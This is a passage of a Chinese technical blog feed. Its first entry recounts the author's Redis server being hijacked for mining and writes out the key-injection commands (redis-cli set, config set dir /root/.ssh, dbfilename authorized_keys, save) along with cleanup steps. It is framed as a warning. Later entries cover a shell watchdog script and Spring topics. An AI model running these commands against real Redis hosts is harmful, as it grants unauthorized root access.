        <content type="html"><![CDATA[<h1 id="为什么当你学习Redis，发现自己的服务器在挖矿了"><a href="#为什么当你学习Redis，发现自己的服务器在挖矿了" class="headerlink" title="为什么当你学习Redis，发现自己的服务器在挖矿了"></a>为什么当你学习Redis，发现自己的服务器在挖矿了</h1><p>​    在我学习Redis时，因为嫌麻烦就没有设置密码，结果导致一段时间后系统提醒我，我的服务器上有挖矿行为，如果不清理就停止运行，我一脸懵逼，并不断上网查找哪里出现问题了，但最终还是没有解决，无奈下我初始化了服务器。希望本篇文章能对你有锁帮助，顺利让你体会到入侵自己服务器的感觉。</p><h2 id="你是如何连接服务器的？"><a href="#你是如何连接服务器的？" class="headerlink" title="你是如何连接服务器的？"></a>你是如何连接服务器的？</h2><p>​    在最初我们购买好自己的服务器后，要么在服务器厂商页面进行安全连接，要么通过<code>SSH 用户名@密码</code>方式进行连接，例如下图：</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h78eo827x4j30to08tdgt.jpg" alt="image-20221017171909179"></p><p>​    但到后面我们发现每次都需要输入密码，也太麻烦了，可以利用秘钥登陆服务器。那如何获取到你的秘钥呢？</p><ol><li><p>客户端通过命令行模式输入：<code>ssh-keygen</code>生成自己的公钥和私钥（这里可以指定参数，具体自己查）。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h78evcmqqrj30tp06ht9x.jpg" alt="image-20221017172559852"></p></li><li><p>手动将客户端的公钥放入远程<a href="https://cloud.tencent.com/product/cvm?from=10680">服务器</a>的指定位置,/root/.ssh/authorized_keys。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h78f016nb3j30ec04wmxd.jpg" alt="image-20221017173030351"></p></li><li><p>现在我们再通过ssh进行登陆，可以看到直接登陆到服务器了</p></li></ol><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h78f21boi2j30p606l74x.jpg" alt="image-20221017173225460"></p><p>那说了这么多，我们发现只要服务器上有你的秘钥，你就可以直接进行登陆，不需要设置密码。那这和Redis有啥关系呢？</p><h2 id="你是如何连接Redis的？"><a href="#你是如何连接Redis的？" class="headerlink" title="你是如何连接Redis的？"></a>你是如何连接Redis的？</h2><p>通常有三种：</p><ol><li>在服务器中使用<code>redis-cli</code>进行操作</li><li>在代码中连接使用</li><li>在本地远程连接使用：<code>redis-cli -h IP地址</code></li></ol><p>而我们最长使用的就是使用代码进行连接，因此需要修改Redis的配置文件。来运行我们远程访问。修改一下参数：</p><ol><li><code>protected-mode no</code></li><li><code>bind 0.0.0.0</code></li></ol><p>​    如果你忘了设置密码了，当Redis重新加载配置文件后，理论上你能访问到的同时，别人只要知道你的IP地址，也就能操作你的Redis了，下图显示本地可以直接访问，并进行操作了。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h78fufgzrxj30oz065mxb.jpg" alt="image-20221017175943082"></p><p>​    接下来我们对Redis存储一些值，输入：<code>cat 你的公钥本地地址 | redis-cli -h 服务器IP地址 -x set crackit</code></p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h78fzfmrdlj311t0990tq.jpg" alt="image-20221017180431887"></p><p>​    通过上面的指令，我们已经成功的将公钥值放入Redis中了，并可以查询到。</p><blockquote><p>192.168.1.11:6379&gt; config set dir /root/.ssh/    配置地址设置</p><p>OK </p><p>192.168.1.11:6379&gt; config get dir </p><ol><li>“dir” 2) “/root/.ssh” </li></ol><p>192.168.1.11:6379&gt; config set dbfilename “authorized_keys”</p><p>OK</p><p>192.168.1.11:6379&gt; save </p><p>OK</p></blockquote><p>​    上面相当于把你redis中存储的值直接保存到了<code>/root/.ssh/authorized_keys </code>这个文件里,这不就是我们远程连接设置秘钥的地方嘛，我草！！！，所以这时候你的服务器已经可以让别人进出无阻了，想干嘛干嘛了。关键这不是最恶心人的。当服务器厂商对你提醒后，你去检查你的秘钥，发现真的多出来一个，你想删却发现没有权限。如果运气好你可以在定时任务中找到莫名奇妙的任务，你删掉，但并没什么用，相当于你家大门已经没有了，你疯狂的上网搜索，发现可以用<code>chattr</code>来修改文件权限，但惊奇的发现chatter这个指令不存在，是的，人家把你的大砍刀也直接顺走了。我们一步步来解决。</p><ol><li>首先我们需要chatter来修改文件属性，但是显示指令不存在<ol><li>使用：<code>yum -y install e2fsprogs</code>,但是可能显示该包已经存在</li><li>直接：<code>yum remove e2fsprogs</code>卸载之前的，然后从新下载。</li></ol></li><li>这时候看chatter应该是可以用了<ol><li>使用：<code>lsattr authorized_keys</code>，去检查该文件</li><li><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h78hbt51vxj30tk02haa7.jpg" alt="image-20221017185101472"></li><li>如果是这种情况说明文件已经被锁定了，我们使用：<code>chattr -ia authorized_keys </code>也就是去掉这两个属性。</li></ol></li><li>这时候该文件已经可以被chmod修改权限了，使用<code>chmod 777 authorized_keys</code></li><li>如果上面都没问题，使用：<code>rm -f authorized_keys</code> 直接删除。</li><li>最后检查定时任务之类的。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    由于攻击是我亲身经历的，让我们烦恼了好一阵子，所以在这里写下来，希望能对你有所帮助。不要在服务器上尝试我上述的打开Redis权限的步骤，因为你大概率十分钟之内就被攻击了。别不信，我就是这么被攻击的。</p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell脚本</title>
      <link href="/2022/11/25/Linux/shell%E8%84%9A%E6%9C%AC/"/>
      <url>/2022/11/25/Linux/shell%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h1><h2 id="输入输出重定向"><a href="#输入输出重定向" class="headerlink" title="输入输出重定向"></a>输入输出重定向</h2><blockquote><p>我们在后台挂在jar包时，常使用过一个命令：<code>nohup java -jar xxx.jar &gt; java.log 2&gt;&amp;1 &amp;</code></p><p>这里就有几个知识点：</p><ol><li>末尾的 <code>&amp;</code> 代表后台默认启动，页面关闭后，程序终止。</li><li>头部的 <code>nohup</code> 表示页面关闭后，后台仍继续运行，如果没有指定日志文件，则默认将输出重定向到<code>nohup.log</code>文件</li><li><code>java -jar xxx.jar</code>最基本的启动jar包</li><li><code>&gt; java.log</code> 将运行jar包后的输出日志文件重定向到 <code>java.log</code>文件中</li><li><code>2&gt;&amp;1</code>将标准输出与标准错误输出合并，在当前语义下就是将所有信息输出到 <code>java.log</code>文件。<ol><li>如果只写 <code>&gt;</code> 表示只将正常输出重定向到log文件中，错误信息直接显示页面</li><li>如果写 <code>2&gt;</code> 表示只将错误输出重定向到log文件中，正常信息直接显示页面</li></ol></li><li><code>&gt;</code> 默认表示重定向，并覆盖原来内容</li><li><code>&gt;&gt;</code> 表示以追加的方式重定向</li></ol></blockquote><p>这样我们就可以监控到后台运行程序的日志信息了。</p><h2 id="shell脚本保证程序运行"><a href="#shell脚本保证程序运行" class="headerlink" title="shell脚本保证程序运行"></a>shell脚本保证程序运行</h2><blockquote><p><strong>需求</strong>：当我们将项目挂在到服务器中，可能过一会儿服务就挂机了，我们可能还不知道请求，就需要一个脚本定时的去监控，程序是否仍在运行中。</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">lsof -i:8080</span><br><span class="line">renren=$?</span><br><span class="line">lsof -i:82</span><br><span class="line">getaway=$?</span><br><span class="line">lsof -i:9001</span><br><span class="line">manager=$?</span><br><span class="line">lsof -i:8001</span><br><span class="line">back=$?</span><br><span class="line"><span class="comment">#echo &quot;&#x27;renren:&#x27;, $&#123;renren&#125;&quot;</span></span><br><span class="line"><span class="comment">#echo &quot;&#x27;getaway:&#x27;,$&#123;getaway&#125;&quot;</span></span><br><span class="line"><span class="comment">#echo &quot;&#x27;manager:&#x27;,$&#123;manager&#125;&quot;</span></span><br><span class="line"><span class="comment">#echo &quot;&#x27;back:&#x27;,$&#123;back&#125;&quot;</span></span><br><span class="line"><span class="comment"># 判断项目文件都是否都正产运转，如果没有运转，则进行记录日志，并重新启动服务</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$&#123;back&#125;</span> != 0 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        <span class="built_in">cd</span> /project/qiyuan/dist</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(date +%F%n%T)</span>, server restart&quot;</span> &gt;&gt; renre.log</span><br><span class="line">        <span class="built_in">nohup</span> node server.js &gt;&gt; renre.log 2&gt;&amp;1 &amp;</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$&#123;renren&#125;</span> != 0 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        <span class="built_in">cd</span> /project/qiyuan/java</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(date +%F%n%T)</span>, server restart&quot;</span> &gt;&gt; renren.log</span><br><span class="line">        <span class="built_in">nohup</span> java -jar renren-fast.jar &gt;&gt; renren.log 2&gt;&amp;1 &amp;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$&#123;getaway&#125;</span> != 0 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        <span class="built_in">cd</span> /project/qiyuan/java</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(date +%F%n%T)</span>, server restart&quot;</span> &gt;&gt; getaway.log</span><br><span class="line">        <span class="built_in">nohup</span> java -jar getaway-0.0.1-SNAPSHOT.jar &gt;&gt; getaway.log 2&gt;&amp;1 &amp;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$&#123;manager&#125;</span> != 0 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        <span class="built_in">cd</span> /project/qiyuan/java</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(date +%F%n%T)</span>,node server restart&quot;</span> &gt;&gt; manager.log</span><br><span class="line">        <span class="built_in">nohup</span> java -jar manager-0.0.1-SNAPSHOT.jar &gt;&gt; manager.log 2&gt;&amp;1 &amp;</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>封装自己的SDK</title>
      <link href="/2022/11/25/Spring/%E5%B0%81%E8%A3%85%E8%87%AA%E5%B7%B1%E7%9A%84SDK/"/>
      <url>/2022/11/25/Spring/%E5%B0%81%E8%A3%85%E8%87%AA%E5%B7%B1%E7%9A%84SDK/</url>
      
        <content type="html"><![CDATA[<h1 id="封装自己的SDK"><a href="#封装自己的SDK" class="headerlink" title="封装自己的SDK"></a>封装自己的SDK</h1><p>​    我们在开发Spring项目时常常会引入各种<code>xxx-spring-boot-starter</code>的依赖包，然后在配置文件中填入必要的信息，就可以使用依赖提供好的容器。这里是在鱼皮新项目直播中学习到的，特此记录一下。可在未来封装自己的SDK进行封装与装逼。</p><h2 id="SDK项目下"><a href="#SDK项目下" class="headerlink" title="SDK项目下"></a>SDK项目下</h2><ol><li>将pom.xml中的<build>标签删除</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>定义我们需要的模型</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">sqlSessionFactory</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String driver;</span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取连接</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;创建并返回数据库Connection&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>自动扫描并添加容器</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(&quot;sicheng.database&quot;)</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@ComponentScan</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span>  <span class="title class_">sqlSessionConfig</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String driver;</span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> sqlSessionFactory <span class="title function_">getSqlSessionFactory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">sqlSessionFactory</span>(userName,password,driver,url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>在resources资源下进行配置：META-INF包下的spring.factories文件</li></ol><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># spring boot starter  这里配置你注册容器类的引用，也就是第三步的类引用，会自动扫描并注入</span></span><br><span class="line"><span class="attr">org.springframework.boot.autoconfigure.EnableAutoConfiguration</span>=<span class="string">com.example.sichengclientsdk.sqlSessionConfig</span></span><br></pre></td></tr></table></figure><ol start="5"><li>Maven进行install操作，在你的pom.xml中找到对应的依赖值</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sicheng<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sicheng-client-sdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="6"><li>在别的项目中进行引用，这里需要注意：maven的install只会创建在本地，如果远程使用，需要注册到Maven依赖库</li></ol><h2 id="需要依赖的项目"><a href="#需要依赖的项目" class="headerlink" title="需要依赖的项目"></a>需要依赖的项目</h2><ol><li>依赖引入</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sicheng<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sicheng-client-sdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>在Resource中填入需要的值，这里注意我们需要在SDK环境中引入<code>spring-boot-configuration-processor</code>,这样当我们使用依赖后，可在<code>application.yml</code>中看到提示</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">sicheng:</span></span><br><span class="line">  <span class="attr">database:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/sicheng</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br></pre></td></tr></table></figure><ol start="3"><li>自动注入容器并使用</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Resource</span></span><br><span class="line">sqlSessionConfig sqlSessionConfig;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">testMySDK</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">sqlSessionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> sqlSessionConfig.getSqlSessionFactory();</span><br><span class="line">    factory.getConnection();</span><br><span class="line">    <span class="comment">// 输出：创建并返回数据库Connection</span></span><br><span class="line">    <span class="comment">// 输出：sqlSessionFactory(userName=root, password=123456, driver=com.mysql.cj.jdbc.Driver, url=jdbc:mysql://localhost:3306/sicheng)</span></span><br><span class="line">    System.out.println(factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SDK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring如何解决循环依赖</title>
      <link href="/2022/11/25/Spring/Spring%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96/"/>
      <url>/2022/11/25/Spring/Spring%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring循环依如何解决？"><a href="#Spring循环依如何解决？" class="headerlink" title="Spring循环依如何解决？"></a>Spring循环依如何解决？</h2><blockquote><p>循环依赖是什么？</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">  B b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>&#123;</span><br><span class="line">  A a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//简单来说就是A的创建依赖于B，B的创建依赖于A。</span></span><br></pre></td></tr></table></figure><blockquote><p>在一般场景下，如何解决循环依赖的问题？</p><p>我们知道对象的创建一般有：</p><p>​    无参构造器+属性Set方法初始化对象</p><p>​    有参构造器直接初始化对象</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过有参构造器初始化</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">  B b;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">A</span><span class="params">(B b)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.b = b;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>&#123;</span><br><span class="line">  A a;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">B</span><span class="params">(A a)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.a = a;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">client</span>&#123;</span><br><span class="line">  <span class="comment">//我们发现会无限套娃下去，有参构造器方法不能使用</span></span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">A</span>(<span class="keyword">new</span> <span class="title class_">B</span>(<span class="keyword">new</span> <span class="title class_">A</span>(<span class="keyword">new</span> <span class="title class_">B</span>())))  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过无参参构造器初始化</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">  B b;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setB</span><span class="params">(B b)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.b = b;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>&#123;</span><br><span class="line">  A a;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setA</span><span class="params">(A a)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.a = a;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">client</span>&#123;</span><br><span class="line">  <span class="comment">//可以发现无参构造器+set方法可以完成任务</span></span><br><span class="line">  <span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">a</span>();</span><br><span class="line">  <span class="type">B</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">b</span>();</span><br><span class="line">  a.setB(b);</span><br><span class="line">  b.setA(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>通过上面的场景，我们就可以知道利用Set方法可以解决循环依赖，那在Spring中也是如此，但增加了亿丝细节</p></blockquote><blockquote><p>我们在使用Spring时，常讲Spring容器，也就是我们不去new对象，而是从容器中取对象，那这个容器到底是什么？</p></blockquote><p>​    容器顾名思义，就是存放数据对象的地方，又是在内存中的，每次我们向容器里取对象时都会提供一个对象名，或者是类型信息，然后容器返回相应的数据，那在Java基础中，我们学习到的Map结构，就很符合这样要求，通过Key，Value来存储对象信息。所以其实Spring容器就是通过一个Map来实现的，也就是这个家伙<code>Map&lt;String, Object&gt; singletonObjects</code>,但更确切的来说它叫做一级缓存，专门存放已经完整经过生命周期的对象（对象初始化后，参数也赋值了）。那既然有一级缓存就可能有其他级缓存，确实Spring有三层缓存，而这三层缓存就是来解决循环依赖的关键！！！</p><blockquote><p>三级缓存为哪三级，分别是干嘛的？</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8heivk5brj30wo0bz40a.jpg" alt="image-20220705113930715"></p><p>上图就Spring中的源码，三个Map对象的就是三级缓存</p><ol><li><code>singletonObjects</code>:一级缓存存放完整生命周期的Bean，我们从容器中取对象，就从这里找的。</li><li><code>earlySingletonObjects</code>:二级缓存存放半生命周期的Bean，可以理解为通过无参构造器向堆空间申请内存了，但是没有对属性赋值。</li><li><code>singletonFactories</code>:三级缓存存放创建Bean的工厂。</li></ol><blockquote><p>我们知道Spring容器中可以设置对象为多例模式和单例模式，每种模式都可以解决循环依赖问题吗？</p></blockquote><blockquote><p>单例模式我们知道是存放在一级缓存中的，那<em>prototype</em>模式的对象是否也在一级缓存中？</p></blockquote><p>下面我们先来看看当创建prototype对象时，底层发生了什么</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">getBean</span><span class="params">(String name, Class&lt;T&gt; requiredType)</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">    <span class="built_in">this</span>.assertBeanFactoryActive();</span><br><span class="line">  <span class="comment">//获取目标bean</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getBeanFactory().getBean(name, 